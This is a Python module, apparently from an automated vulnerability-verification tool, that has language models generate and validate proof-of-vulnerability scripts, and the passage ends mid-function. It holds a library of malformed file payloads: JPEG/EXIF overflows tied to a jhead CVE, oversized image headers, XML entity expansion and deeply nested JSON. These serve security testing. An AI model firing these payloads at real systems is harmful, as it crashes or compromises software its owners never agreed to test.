"""
AutoPoV Verifier Agent Module
Generates and validates Proof-of-Vulnerability (PoV) scripts
"""

import json
import re
import ast
import os
from typing import Dict, Optional, Any, List
from pathlib import Path
from datetime import datetime

from langchain_core.messages import SystemMessage, HumanMessage

try:
    from langchain_openai import ChatOpenAI
    OPENAI_AVAILABLE = True
except ImportError:
    OPENAI_AVAILABLE = False

try:
    from langchain_ollama import ChatOllama
    OLLAMA_AVAILABLE = True
except ImportError:
    OLLAMA_AVAILABLE = False

try:
    import javalang
    JAVALANG_AVAILABLE = True
except ImportError:
    JAVALANG_AVAILABLE = False

# tree-sitter 0.23+ uses individual grammar packages instead of tree_sitter_languages.
# Try the modern API first, fall back gracefully so regex remains available.
try:
    from tree_sitter import Language as _TS_Language, Parser as _TS_Parser
    import tree_sitter_javascript as _ts_js
    import tree_sitter_typescript as _ts_ts
    _TS_JS_LANG  = _TS_Language(_ts_js.language())
    _TS_TS_LANG  = _TS_Language(_ts_ts.language_typescript())
    _TS_TSX_LANG = _TS_Language(_ts_ts.language_tsx())
    TREE_SITTER_AVAILABLE = True
except Exception:
    TREE_SITTER_AVAILABLE = False
    _TS_JS_LANG = _TS_TS_LANG = _TS_TSX_LANG = None  # type: ignore

from app.config import settings
from app.openrouter_client import OpenRouterReasoningChat, extract_usage_details
from prompts import (
    format_pov_generation_prompt,
    format_pov_generation_prompt_offline,
    format_pov_validation_prompt,
    format_pov_validation_prompt_offline,
    format_retry_analysis_prompt,
    format_retry_analysis_prompt_offline,
    format_pov_refinement_prompt,
    format_pov_refinement_prompt_offline,
    format_pov_scaffold_prompt,
    format_retry_constrained_prompt,
)
from agents.static_validator import get_static_validator, ValidationResult
from agents.unit_test_runner import get_unit_test_runner, TestResult


# ---------------------------------------------------------------------------
# Gate reason -> resolution_status mapping
# ---------------------------------------------------------------------------
# Keys are the structured message prefixes already used by _contract_gate().
# First match wins; module-level so tests can import directly.

_GATE_CODE_MAP: List[tuple] = [
    ('preflight:', 'contradicted'),
    ('native target:', 'unresolved'),
    ('python target:', 'unresolved'),
    ('node target:', 'unresolved'),
    ('java target:', 'unresolved'),
    ('javascript target:', 'unresolved'),
    ('browser target:', 'unresolved'),
    ('live_app target:', 'unresolved'),
    ('pre-generation success signal', 'partially_resolved'),
]


def _resolution_status_from_gate(gate_blocking: List[str]) -> str:
    """Map _contract_gate() blocking reasons to a resolution_status string.

    Uses structured message prefixes — no free-form parsing.
    First match wins; default is 'unresolved'.
    """
    for reason in gate_blocking:
        lower = reason.lower()
        for prefix, status in _GATE_CODE_MAP:
            if lower.startswith(prefix) or prefix in lower:
                return status
    return 'unresolved'


# ---------------------------------------------------------------------------
# Format-aware payload library
# ---------------------------------------------------------------------------
# Exposed as a top-level function so docker_runner can import and call it
# directly for the format-rejection retry tier (Task 0b).

def get_format_payloads(ext: str) -> List[bytes]:
    """Return a list of binary payloads for the given file extension.

    Each payload has a structurally valid magic/header prefix so that
    format-validating parsers (e.g. jhead) accept the file as the correct
    type and actually reach the vulnerable parsing code.  The payloads
    carry oversized internal fields that overflow the parser.

    Args:
        ext: file extension with leading dot, e.g. '.jpg', '.png'. Pass
             '' or an unrecognised extension to get the generic set.
    Returns:
        List of bytes payloads, ordered from most-specific to generic.
    """
    # Minimal SOS section: jhead takes case M_SOS -> return TRUE without reading more markers.
    # SOS length=12: 2 (Ns) + 2*Ns component entries + 3 bytes spec = 2+2+3+... standard is 12.
    _SOS = b'\xff\xda\x00\x0c\x03\x01\x00\x02\x11\x03\x11\x00\x3f\x00'

    # Canon maker note JPEG — exercises ProcessCanonMakerNoteDir code path (CVE-2021-3496).
    # IFD0 has TAG_MAKE="Canon" and TAG_MAKER_NOTE pointing to a Canon IFD with Tag=1,
    # Components=17, ByteCount=34.  With an ASan-instrumented jhead the -n%99i argv exploit
    # is the preferred crash trigger; this payload exercises the Canon branch for completeness.
    import struct as _struct
    _NUM_IFD0 = 2
    _IFD0_START = 8
    _IFD0_SIZE = 2 + 12 * _NUM_IFD0 + 4   # 34
    _IFD0_END = _IFD0_START + _IFD0_SIZE   # 42
    _MAKE_OFFSET = _IFD0_END               # 42
    _MAKE_STR = b'Canon\x00'               # 6 bytes
    _MN_OFFSET = _MAKE_OFFSET + len(_MAKE_STR)  # 48
    _MN_IFD_SIZE = 2 + 12 * 1 + 4         # 18
    _DATA_OFFSET = _MN_OFFSET + _MN_IFD_SIZE    # 66
    _DATA = b'\x00' * 34                   # 17 * sizeof(short)
    _TIFF_LEN = _DATA_OFFSET + len(_DATA)  # 100
    _tiff = bytearray(_TIFF_LEN)
    _struct.pack_into('<HHI', _tiff, 0, 0x4949, 0x002A, _IFD0_START)
    _struct.pack_into('<H',   _tiff, _IFD0_START, _NUM_IFD0)
    _struct.pack_into('<HHII', _tiff, _IFD0_START + 2,      0x010F, 2, 6, _MAKE_OFFSET)
    _struct.pack_into('<HHII', _tiff, _IFD0_START + 2 + 12, 0x927C, 7, _MN_IFD_SIZE + len(_DATA), _MN_OFFSET)
    _struct.pack_into('<I',   _tiff, _IFD0_START + 2 + 24, 0)
    _tiff[_MAKE_OFFSET:_MAKE_OFFSET + 6] = _MAKE_STR
    _struct.pack_into('<H',   _tiff, _MN_OFFSET, 1)
    _struct.pack_into('<HHII', _tiff, _MN_OFFSET + 2, 0x0001, 3, 17, _DATA_OFFSET)
    _struct.pack_into('<I',   _tiff, _MN_OFFSET + 2 + 12, 0)
    _canon_exif = b'Exif\x00\x00' + bytes(_tiff)
    _canon_app1_len = len(_canon_exif) + 2
    _CANON_JPEG = (
        b'\xff\xd8'
        + b'\xff\xe1'
        + _struct.pack('>H', _canon_app1_len)
        + _canon_exif
        + _SOS
    )
    del _struct, _tiff, _canon_exif  # clean up temp vars

    _JPEG: List[bytes] = [
        # Canon maker note JPEG — valid IFD structure with TAG_MAKE="Canon" + TAG_MAKER_NOTE
        # Routes to ProcessCanonMakerNoteDir; triggers the CVE-2021-3496 code path.
        _CANON_JPEG,
        # SOI + small JFIF APP0 (16 bytes, minimum valid) + overlong APP1 Exif (65532 bytes content)
        # -> jhead processes Exif IFD with entry count=65535, then hits SOS and returns TRUE
        b'\xff\xd8'                              # SOI
        + b'\xff\xe0\x00\x10'                    # APP0 marker + length=16 (minimal JFIF)
        + b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'  # 14 bytes JFIF content
        + b'\xff\xe1' + b'\xff\xfe'              # APP1 Exif marker + length=65534 (content=65532)
        + b'Exif\x00\x00'                        # Exif identifier (6 bytes)
        + b'II\x2a\x00'                          # TIFF LE header (4 bytes)
        + b'\x08\x00\x00\x00'                    # IFD0 offset=8 (4 bytes)
        + b'\xff\xff'                            # IFD0 entry count=65535 (2 bytes) OVERFLOW
        + b'B' * (65532 - 6 - 4 - 4 - 2)        # pad rest of APP1 segment
        + _SOS,                                  # SOS -> jhead returns TRUE cleanly
        # SOI + APP1 Exif only (no JFIF): direct EXIF parser path, entry count overflow
        b'\xff\xd8'                              # SOI
        + b'\xff\xe1' + b'\xff\xfe'              # APP1 Exif marker + length=65534
        + b'Exif\x00\x00'                        # Exif identifier
        + b'II\x2a\x00'                          # TIFF LE header
        + b'\x08\x00\x00\x00'                    # IFD0 offset=8
        + b'\xff\xff'                            # entry count=65535 OVERFLOW
        + b'B' * (65532 - 6 - 4 - 4 - 2)        # pad
        + _SOS,                                  # SOS -> clean exit
        # SOI + max-length COM comment + SOS (tests comment parsing path)
        b'\xff\xd8'                              # SOI
        + b'\xff\xfe' + b'\xff\xfe'              # COM marker + length=65534 (content=65532)
        + b'C' * 65532                           # comment content
        + _SOS,                                  # SOS -> clean exit
    ]
    _PNG: List[bytes] = [
        # Valid PNG sig + IHDR with width/height=0xffffffff (integer overflow in dim reader)
        b'\x89PNG\r\n\x1a\n' + b'\x00\x00\x00\rIHDR'
        + b'\xff\xff\xff\xff' + b'\xff\xff\xff\xff'
        + b'\x08\x02\x00\x00\x00' + b'A' * 4096,
    ]
    _GIF: List[bytes] = [
        b'GIF89a' + b'\xff\xff' + b'\xff\xff' + b'\xf7\x00\x00' + b'A' * 65530,
    ]
    _TIFF: List[bytes] = [
        b'II*\x00' + b'\xff' * 65536,  # TIFF LE with overflowed IFD offset
        b'MM\x00*' + b'\xff' * 65536,  # TIFF BE
    ]
    _WEBP: List[bytes] = [
        b'RIFF' + b'\xff\xff\xff\xff' + b'WEBP' + b'A' * 65530,
    ]
    _BMP: List[bytes] = [
        b'BM' + b'\xff\xff\xff\xff' + b'\x00' * 4 + b'\x36\x00\x00\x00' + b'A' * 65530,
    ]
    _SOS_GENERIC = b'\xff\xda\x00\x0c\x03\x01\x00\x02\x11\x03\x11\x00\x3f\x00'
    _GENERIC: List[bytes] = [
        # JPEG: SOI + small JFIF APP0 (16 bytes) + Exif APP1 overflow + SOS
        b'\xff\xd8'
        + b'\xff\xe0\x00\x10'
        + b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
        + b'\xff\xe1' + b'\xff\xfe'
        + b'Exif\x00\x00' + b'II\x2a\x00' + b'\x08\x00\x00\x00' + b'\xff\xff'
        + b'B' * (65532 - 6 - 4 - 4 - 2)
        + _SOS_GENERIC,
        b'\x89PNG\r\n\x1a\n' + b'\x00\x00\x00\rIHDR' + b'\xff' * 4096,
        b'GIF89a' + b'\xff\xff' + b'\xff\xff' + b'A' * 65530,
        b'%PDF-1.4\n' + b'A' * 65536,
        b'A' * 65536,
    ]
    _XML: List[bytes] = [
        # Well-formed XML with deeply nested elements — hits recursion/buffer limits
        b'<?xml version="1.0"?>\n<root>' + b'<a>' * 10000 + b'X' * 65536 + b'</a>' * 10000 + b'</root>',
        # Overlong attribute value
        b'<?xml version="1.0"?><root attr="' + b'A' * 65536 + b'"/>',
        # Invalid token after valid header — triggers parse error path
        b'<?xml version="1.0"?><root>\x00\xff\xfe' + b'B' * 65536 + b'</root>',
        # Entity expansion (billion laughs lite)
        b'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a "' + b'A' * 8192 + b'">]><x>&a;&a;&a;&a;&a;&a;&a;&a;</x>',
    ]
    _JSON: List[bytes] = [
        # Deeply nested array — hits recursion depth limit
        b'[' * 100000 + b'1' + b']' * 100000,
        # Overlong string value
        b'{"key": "' + b'A' * 65536 + b'"}',
        # Overlong number
        b'{"n": ' + b'9' * 65536 + b'}',
        # Invalid UTF-8 inside string
        b'{"k": "' + b'\xff\xfe' * 32768 + b'"}',
    ]
    _MAP: Dict[str, List[bytes]] = {
        '.jpg':  _JPEG + _GENERIC,
        '.jpeg': _JPEG + _GENERIC,
        '.png':  _PNG  + _GENERIC,
        '.gif':  _GIF  + _GENERIC,
        '.tif':  _TIFF + _GENERIC,
        '.tiff': _TIFF + _GENERIC,
        '.webp': _WEBP + _GENERIC,
        '.bmp':  _BMP  + _GENERIC,
        '.xml':  _XML  + _GENERIC,
        '.json': _JSON + _GENERIC,
    }
    return _MAP.get(ext.lower(), _GENERIC)


class VerificationError(Exception):
    """Exception raised during verification"""
    pass


class VulnerabilityVerifier:
    """Generates and validates PoV scripts"""

    # Names that are never valid entrypoints — used by all entrypoint extractors.
    NATIVE_INVALID_ENTRYPOINTS: frozenset = frozenset({
        'unknown', 'none', 'n/a', 'main', 'constructor', '__init__',
        'undefined', 'null', 'true', 'false', 'init', 'setup',
        'vulnerable_binary', '', 'test', 'run', 'start', 'execute',
    })

    def __init__(self):
        self._llm = None

    def _infer_runtime_profile_from_filepath(self, filepath: str) -> str:
        ext = Path(filepath or '').suffix.lower()
        if ext in {'.c', '.h'}:
            return 'c'
        if ext in {'.cc', '.cpp', '.cxx', '.hpp'}:
            return 'cpp'
        if ext in {'.js', '.jsx'}:
            return 'javascript'
        if ext in {'.ts', '.tsx'}:
            return 'node'
        if ext == '.py':
            return 'python'
        return ''

    def _infer_pov_script_runtime(self, pov_script: str) -> str:
        script = str(pov_script or '')
        stripped = script.lstrip()
        if stripped.startswith('<?php'):
            return 'php'
        if stripped.startswith('#!/bin/bash') or stripped.startswith('#!/usr/bin/env bash'):
            return 'shell'
        if (
            stripped.startswith('#!/usr/bin/env node')
            or 'console.log(' in script
            or 'require(' in script
            or 'process.env' in script
            or 'document.' in script
            or 'window.' in script
            or 'addEventListener(' in script
            or 'querySelector' in script
            or 'createElement(' in script
            or 'innerHTML' in script
            or re.search(r'(^|\n)\s*(const|let|var)\s+', script)
        ):
            return 'javascript'
        return 'python'

    def _validate_pov_script_syntax(self, pov_script: str) -> Optional[str]:
        runtime = self._infer_pov_script_runtime(pov_script)
        try:
            if runtime == 'python':
                ast.parse(pov_script)
                return None
            if runtime == 'javascript':
                syntax_check = get_unit_test_runner().validate_syntax(pov_script, runtime_profile='javascript')
                if syntax_check.get('valid'):
                    return None
                return syntax_check.get('error') or 'JavaScript syntax error'
            return None
        except SyntaxError as e:
            return str(e)
        except Exception as e:
            return str(e)

    def _extract_inline_eval_payloads(self, pov_script: str) -> List[str]:
        script = str(pov_script or '')
        payloads: List[str] = []
        patterns = [
            r'''['"](?:-e|--eval)['"]\s*,\s*(['"])(.*?)\1''',
            r'''(?:-e|--eval)\s+(['"])(.*?)\1''',
        ]
        for pattern in patterns:
            for match in re.finditer(pattern, script, re.DOTALL):
                payload = match.group(2)
                if payload and payload not in payloads:
                    payloads.append(payload)
        return payloads

    def _references_target_binary(self, pov_script: str) -> bool:
        script = str(pov_script or '')
        markers = [
            'TARGET_BINARY', 'TARGET_BIN',
            'subprocess.run([binary', 'subprocess.run([binary,',
            "os.environ.get('TARGET_BINARY')", "os.environ.get('TARGET_BIN')",
            'process.env.TARGET_BINARY', 'process.env.TARGET_BIN',
        ]
        return any(marker in script for marker in markers)

    def _generated_c_harness_escaping_issues(self, pov_script: str) -> List[str]:
        """Detect only truly malformed C harnesses where a real newline character appears
        inside an embedded C string literal (i.e. the written .c file would be syntactically
        broken).  Double-escaped \\n sequences (\\\\n in the Python source) are *correct* C
        and must not be flagged regardless of whether the host string is a raw string,
        a concatenated quoted string, or a triple-quoted string.
        """
        from agents.pov_sanitizer import SANITIZER_MARKER

        script = str(pov_script or '')
        lower_script = script.lower()
        if '.c' not in lower_script and '.cpp' not in lower_script:
            return []
        if 'write_text(' not in lower_script and 'open(' not in lower_script:
            return []

        # If the sanitizer already ran on this script, it fixed all bare-newline
        # issues deterministically — no need to re-check.
        if SANITIZER_MARKER in script:
            return []
    
        # The only genuinely broken case is when a *real* newline character (\n) appears
        # between the opening and closing quote of a C string literal inside the harness
        # source being written.  This produces an unterminated-string-literal compiler error.
        # Pattern: a C string starting with '"', then some non-quote chars, then a real \n,
        # then optional whitespace and another '"' (continuation in concatenated Python strs).
        # We deliberately do NOT flag '\\n' (backslash-n) because that is valid C escape syntax.
        broken_c_string_patterns = [
            # Real newline inside a C fprintf/printf/puts/sprintf string argument.
            # Deliberately do NOT use re.S: [^)\n] and [^"\n] keep the match
            # on a single logical line, preventing false positives where the regex
            # crosses raw-string line boundaries in an r\"\"\"...\"\"\" harness block.
            r'fprintf\s*\([^)\n]*"[^"\n]*\n[^"\n]*"',
            r'printf\s*\([^)\n]*"[^"\n]*\n[^"\n]*"',
            r'puts\s*\([^)\n]*"[^"\n]*\n[^"\n]*"',
            r'sprintf\s*\([^)\n]*"[^"\n]*\n[^"\n]*"',
            r'snprintf\s*\([^)\n]*"[^"\n]*\n[^"\n]*"',
        ]
        for pattern in broken_c_string_patterns:
            m = re.search(pattern, script)
            if m:
                # Confirm the match actually contains a real newline (not \n literal)
                matched_text = m.group(0)
                # If the only newline present is preceded by a backslash it's fine (\\n in C)
                # Strip all \\n sequences and check if a bare newline remains
                stripped = re.sub(r'\\n', '', matched_text)
                if '\n' in stripped:
                    return [
                        'Generated C harness writes a C string containing a bare newline character '
                        '(the .c file will have an unterminated string literal). '
                        'Escape newlines as \\n inside C string arguments.'
                    ]
        return []
    def _native_guardrail_issues(self, pov_script: str, exploit_contract: Optional[Dict[str, Any]], filepath: str) -> List[str]:
        contract = exploit_contract or {}
        plan = contract.get('proof_plan') or {}
        runtime_family = str(plan.get('runtime_family') or contract.get('runtime_profile') or self._infer_runtime_profile_from_filepath(filepath)).lower()
        if runtime_family not in {'native', 'c', 'cpp', 'binary'}:
            return []

        issues: List[str] = []
        lower_script = str(pov_script or '').lower()
        input_mode = str(plan.get('input_mode') or '').lower()
        input_format = str(plan.get('input_format') or '').lower()
        target_entrypoint = str(contract.get('target_entrypoint') or '').strip()

        weak_file_markers = ['does_not_exist', 'nonexistent', 'missing.js', 'no such file', 'definitely_missing']
        if any(marker in lower_script for marker in weak_file_markers):
            issues.append('Native PoV relies on a missing-file path instead of a concrete exploit trigger')

        # Reject unresolved path/binary placeholders that models emit when they have
        # insufficient context.  These scripts can never trigger the oracle because
        # the placeholder paths do not exist inside the proof container.
        path_placeholder_markers = [
            '/path/to/codebase', '/path/to/binary', '/path/to/enchive',
            "'codebase_path'", 'codebase_path=', 'os.environ.copy()\n    env[\'CODEBASE_PATH\']',
        ]
        path_placeholder_lower = [
            '/path/to/codebase', '/path/to/binary', '/path/to/',
            "env['codebase_path']", 'env["codebase_path"]',
        ]
        if any(marker in lower_script for marker in path_placeholder_lower):
            issues.append(
                'PoV contains an unresolved path placeholder (e.g. /path/to/codebase or '
                'CODEBASE_PATH env override); replace with the actual binary path from the exploit contract'
            )

        if input_mode == 'file' and re.search(r'''['"](?:-e|--eval)['"]''', pov_script):
            issues.append('Native proof plan requires file input, but the PoV switches to inline eval mode')

        _probe_bin = str((exploit_contract or {}).get('probe_binary_name') or '').strip()
        if _probe_bin and not self._references_target_binary(pov_script):
            issues.append(
                f"Native PoV does not reference the target binary '{_probe_bin}'. "
                f"Use TARGET_BINARY env var or explicitly reference '{_probe_bin}'."
            )

        if 'no memory-size option detected' in lower_script:
            issues.append('Native PoV contains fallback logic that ignores the observed target surface')

        if input_format == 'javascript':
            for payload in self._extract_inline_eval_payloads(pov_script):
                syntax_check = get_unit_test_runner().validate_syntax(payload, runtime_profile='javascript')
                if not syntax_check.get('valid'):
                    issues.append('Inline eval payload has invalid JavaScript syntax')
                    break

        issues.extend(self._generated_c_harness_escaping_issues(pov_script))

        # ── Detect TARGET_SYMBOL set to a source filename (not a binary name) ──
        # e.g. TARGET_SYMBOL = 'imgfile' where imgfile.c is the source — the binary is 'jhead'.
        # This causes "binary not found" every time because the glob searches for 'imgfile'.
        _ts_match = re.search(r"TARGET_SYMBOL\s*=\s*['\"]([^'\"]+)['\"](?!\s*#[^\n]*probe)", pov_script)
        if _ts_match:
            _ts_val = _ts_match.group(1).strip()
            # Flag if the value looks like a C/C++ source filename stem (no path sep, no extension,
            # but matches a known source-like pattern OR doesn't match the probe_binary_name).
            _probe_bin_name = str((exploit_contract or {}).get('probe_binary_name') or '').strip()
            if _probe_bin_name and _ts_val and _ts_val != _probe_bin_name:
                issues.append(
                    f"TARGET_SYMBOL is '{_ts_val}' but the probe discovered the actual binary is "
                    f"'{_probe_bin_name}'. Change TARGET_SYMBOL = {_probe_bin_name!r} so the binary "
                    f"locator finds the correct executable."
                )
        # Applies to ALL models (online and offline). If a model redeclares TARGET_BINARY,
        # TARGET_BIN, or CODEBASE_PATH as a local variable inside a function, Python treats
        # it as local everywhere in that function — causing UnboundLocalError before assignment.
        _HARNESS_GLOBALS = {'TARGET_BINARY', 'TARGET_BIN', 'CODEBASE_PATH'}
        try:
            import ast as _ast
            _tree = _ast.parse(pov_script)
            for _func in _ast.walk(_tree):
                if isinstance(_func, _ast.FunctionDef):
                    _assigns = {
                        n.id for n in _ast.walk(_func)
                        if isinstance(n, _ast.Name) and isinstance(n.ctx, _ast.Store)
                    }
                    _reads = {
                        n.id for n in _ast.walk(_func)
                        if isinstance(n, _ast.Name) and isinstance(n.ctx, _ast.Load)
                    }
                    _shadowed = _assigns & _reads & _HARNESS_GLOBALS
                    if _shadowed:
                        issues.append(
                            f"PoV shadows harness module-level variable(s) {sorted(_shadowed)} "
                            f"as locals inside function '{_func.name}' — this causes "
                            "UnboundLocalError. Do NOT redeclare TARGET_BINARY, TARGET_BIN, or "
                            "CODEBASE_PATH inside any function. Use the module-level variables directly."
                        )
        except SyntaxError:
            pass  # syntax errors are caught separately by _validate_pov_script_syntax
        except Exception:
            pass

        # Task 4B: C library harness guardrails
        # When repo_surface_class=library_c or execution_surface=c_library_harness,
        # the PoV MUST compile + run an inline harness, not invoke a CLI binary.
        # EXCEPTION: if probe_binary_path is set, the repo has a real CLI binary
        # (e.g. enchive was mis-classified before K&R main fix) — do NOT enforce
        # harness requirement when a binary was actually discovered.
        _repo_surf = str((exploit_contract or {}).get('repo_surface_class') or '').strip().lower()
        _exec_surf = str(plan.get('execution_surface') or contract.get('execution_surface') or '').strip().lower()
        _probe_bin = str((exploit_contract or {}).get('probe_binary_path') or '').strip()
        _has_binary = bool(
            _probe_bin
            or str((exploit_contract or {}).get('probe_binary_name') or '').strip()
            or str((exploit_contract or {}).get('target_binary') or '').strip()
        )
        if (_repo_surf == 'library_c' or _exec_surf == 'c_library_harness') and not _has_binary:
            # Must contain a compile step (clang/gcc invocation)
            if not re.search(r'\b(clang|gcc)\b.*-fsanitize', lower_script):
                issues.append(
                    'C library PoV must compile an inline harness with ASan. '
                    'Add: clang -fsanitize=address,undefined -O0 -g harness.c '
                    '-I/workspace/codebase -o /tmp/harness'
                )
            # Must NOT try to invoke TARGET_BINARY as if it were a CLI tool
            if re.search(r'subprocess\.(run|call|Popen).*TARGET_BINARY', pov_script):
                issues.append(
                    'C library PoV must not invoke TARGET_BINARY as a CLI tool. '
                    'Write and compile an inline harness that calls the library API directly.'
                )

        return issues

    def _coerce_listish(self, value: Any) -> List[Any]:
        if value in (None, ''):
            return []
        if isinstance(value, list):
            return value
        if isinstance(value, tuple):
            return list(value)
        if isinstance(value, dict):
            items: List[Any] = []
            for item_key, item_value in value.items():
                if item_key not in (None, ''):
                    items.append(item_key)
                if item_value not in (None, '', [], {}, ()):
                    items.append(item_value)
            return items
        return [value]

    def _flatten_runtime_feedback(self, runtime_feedback: Optional[Dict[str, Any]]) -> Dict[str, Any]:
        feedback = runtime_feedback or {}
        if not isinstance(feedback, dict):
            return {}
        runtime = feedback.get('runtime') if isinstance(feedback.get('runtime'), dict) else {}
        merged = dict(runtime)
        for key, value in feedback.items():
            if key == 'runtime' and isinstance(value, dict):
                continue
            if value not in (None, '', [], {}, ()):
                merged.setdefault(key, value)
        return merged

    def _render_runtime_feedback(self, validation_errors: Optional[List[str]], runtime_feedback: Optional[Dict[str, Any]]) -> str:
        payload = {
            'validation_errors': [str(item) for item in self._coerce_listish(validation_errors)],
            'runtime_feedback': runtime_feedback or {},
        }
        return json.dumps(payload, indent=2, sort_keys=True)

    def _source_like_target(self, value: Any) -> bool:
        suffix = Path(str(value or '')).suffix.lower()
        return suffix in {'.c', '.cc', '.cpp', '.cxx', '.h', '.hpp', '.java', '.js', '.ts', '.py', '.rb', '.pl', '.sh'}

    def _binary_like_target(self, value: Any, filepath: str = '', target_entrypoint: str = '') -> bool:
        candidate = str(value or '').strip()
        if not candidate or self._source_like_target(candidate):
            return False
        normalized = Path(candidate).name.strip()
        lowered = normalized.lower()
        if lowered in {'', 'unknown', 'none', 'n/a', 'vulnerable_binary'}:
            return False
        entrypoint = str(target_entrypoint or '').strip().lower()
        if entrypoint and lowered == entrypoint:
            return False
        if '/' in candidate or '\\' in candidate:
            return True
        filepath_stem = Path(filepath or '').stem.lower()
        if filepath_stem and lowered == filepath_stem:
            return True
        if re.fullmatch(r'[A-Za-z_]\w*', normalized):
            # Pure identifier token — reject when it matches a likely C function name
            # pattern (lowercase_underscore) and we have no entrypoint guard to
            # distinguish function symbol vs binary name.  Prefer explicit path
            # hints or the filepath stem match above for identifier candidates.
            # Keep the promotion only when entrypoint was confirmed OR the token
            # looks like a typical binary name (no underscores in the middle).
            if not entrypoint:
                # No entrypoint set: only promote if it looks like a binary name
                # (single word, no underscore, or known common binary names).
                if '_' in normalized:
                    return False  # looks like a C function name (e.g. command_extract)
            return True
        return True

    def _infer_native_cli_subcommand(self, target_entrypoint: str, known_subcommands: List[str]) -> str:
        """Return the CLI subcommand that corresponds to target_entrypoint, or '' if none."""
        entrypoint = str(target_entrypoint or '').strip().lower()
        normalized_subcommands = [str(s).strip().lower() for s in (known_subcommands or [])]
        # Exact match
        if entrypoint in normalized_subcommands:
            return entrypoint
        # command_<subcommand> / cmd_<subcommand> prefix pattern
        for prefix in ('command_', 'command-', 'cmd_', 'cmd-'):
            if entrypoint.startswith(prefix):
                suffix = entrypoint[len(prefix):]
                if suffix in normalized_subcommands:
                    return suffix
        return ''

    def _native_entrypoint_requires_function_harness(self, target_entrypoint: Any, known_subcommands: List[str]) -> bool:
        """Return True when a native entrypoint looks like an internal symbol, not a CLI subcommand."""
        entrypoint = str(target_entrypoint or '').strip().lower()
        if entrypoint in {'', 'unknown', 'none', 'n/a'}:
            return False
        return not bool(self._infer_native_cli_subcommand(entrypoint, known_subcommands))

    def _merge_refined_contract(self, base_contract: Optional[Dict[str, Any]], refined_contract: Optional[Dict[str, Any]]) -> Dict[str, Any]:
        """Merge a refinement payload onto an existing normalized contract.

        Target anchors and observed runtime surface are preserved unless the refined
        contract provides a concrete replacement. Payload-level fields may still evolve.
        """
        base = dict(base_contract or {})
        refined = refined_contract if isinstance(refined_contract, dict) else {}
        if not refined:
            return base

        merged = dict(base)
        weak_markers = {'', 'unknown', 'none', 'n/a', 'vulnerable_binary'}

        def _strong(value: Any) -> bool:
            if value in (None, '', [], {}):
                return False
            if isinstance(value, str) and value.strip().lower() in weak_markers:
                return False
            return True

        for key in ('goal', 'inputs', 'trigger_steps', 'success_indicators', 'side_effects', 'preconditions', 'expected_outcome', 'http_method', 'target_url', 'base_url'):
            value = refined.get(key)
            if _strong(value):
                merged[key] = value

        # target_binary and execution_surface may be updated by refinement.
        # target_entrypoint is PROTECTED: the base value comes from static analysis /
        # _canonicalize_target_entrypoint and must never be overwritten by a model
        # refinement that guesses a different symbol.  Only accept a refined
        # target_entrypoint when the base has no concrete value.
        _anchor_invalid = {'', 'unknown', 'none', 'n/a', 'vulnerable_binary'}
        base_ep = str(base.get('target_entrypoint') or '').strip()
        base_ep_concrete = bool(base_ep) and base_ep.lower() not in _anchor_invalid

        for key in ('runtime_profile', 'target_binary', 'execution_surface', 'known_subcommands'):
            value = refined.get(key)
            if _strong(value):
                merged[key] = value

        # target_entrypoint: only accept refinement when base has no concrete value
        refined_ep = refined.get('target_entrypoint')
        if _strong(refined_ep) and not base_ep_concrete:
            merged['target_entrypoint'] = refined_ep

        base_feedback = self._flatten_runtime_feedback((base.get('runtime_feedback') if isinstance(base.get('runtime_feedback'), dict) else {}) or {})
        refined_feedback = self._flatten_runtime_feedback((refined.get('runtime_feedback') if isinstance(refined.get('runtime_feedback'), dict) else {}) or {})
        feedback = dict(base_feedback)
        for k, v in refined_feedback.items():
            if v not in (None, '', [], {}, ()):
                feedback[k] = v
        if feedback:
            merged['runtime_feedback'] = feedback

        base_plan = dict(base.get('proof_plan') or {})
        refined_plan = dict(refined.get('proof_plan') or {})
        plan = dict(base_plan)
        for key, value in refined_plan.items():
            if value in (None, '', [], {}):
                continue
            if isinstance(value, list):
                if key in {'binary_candidates', 'observed_subcommands', 'oracle', 'preflight_checks', 'fallback_strategies', 'candidate_input_modes'}:
                    plan[key] = list(dict.fromkeys([*(plan.get(key) or []), *value]))
                else:
                    plan[key] = value
            elif isinstance(value, dict):
                nested = dict(plan.get(key) or {})
                for nk, nv in value.items():
                    if nv not in (None, '', [], {}):
                        nested[nk] = nv
                plan[key] = nested
            else:
                plan[key] = value

        # When the merged contract settles on a function-level harness, keep the
        # proof plan anchored to the resolved function target and drop stale
        # CLI-only fields that no longer apply.
        contract_surface = str(merged.get('execution_surface') or '').lower()
        plan_surface = str(plan.get('execution_surface') or '').lower()
        if contract_surface == 'function_harness' or plan_surface == 'function_call':
            if merged.get('target_entrypoint'):
                plan['target_entrypoint'] = merged['target_entrypoint']
            for stale_key in ('subcommand', 'route_shape', 'trigger_shape', 'payload_mode'):
                plan.pop(stale_key, None)

        if merged.get('known_subcommands') and not plan.get('observed_subcommands'):
            plan['observed_subcommands'] = list(merged.get('known_subcommands') or [])
        merged['proof_plan'] = plan
        return merged

    def build_handoff_payload(
        self,
        exploit_contract: Optional[Dict[str, Any]],
        cwe_type: str,
        explanation: str,
        vulnerable_code: str,
        filepath: str = '',
        runtime_feedback: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        normalized_contract = self._normalize_exploit_contract(
            exploit_contract or {},
            cwe_type,
            explanation,
            vulnerable_code,
            filepath=filepath,
        )
        feedback = self._flatten_runtime_feedback(
            runtime_feedback
            or (normalized_contract.get('runtime_feedback') if isinstance(normalized_contract.get('runtime_feedback'), dict) else {})
            or {}
        )
        if feedback:
            contract_with_feedback = dict(normalized_contract)
            contract_with_feedback['runtime_feedback'] = feedback
            normalized_contract = self._normalize_exploit_contract(
                contract_with_feedback,
                cwe_type,
                explanation,
                vulnerable_code,
                filepath=filepath,
            )
        plan = dict(normalized_contract.get('proof_plan') or {})
        target_entrypoint = str(normalized_contract.get('target_entrypoint') or '').strip()
        target_url = str(normalized_contract.get('target_url') or normalized_contract.get('base_url') or '').strip()
        binary_candidates = [str(x).strip() for x in self._coerce_listish(plan.get('binary_candidates')) if str(x).strip()]
        locator = {
            'target_entrypoint': target_entrypoint,
            'target_url': target_url,
            'binary_candidates': binary_candidates,
            'observed_target_binary': str(feedback.get('target_binary') or '').strip(),
            'observed_target_url': str(feedback.get('target_url') or '').strip(),
        }
        known_subcommands = [str(x).strip().lower() for x in self._coerce_listish(normalized_contract.get('known_subcommands')) if str(x).strip()]
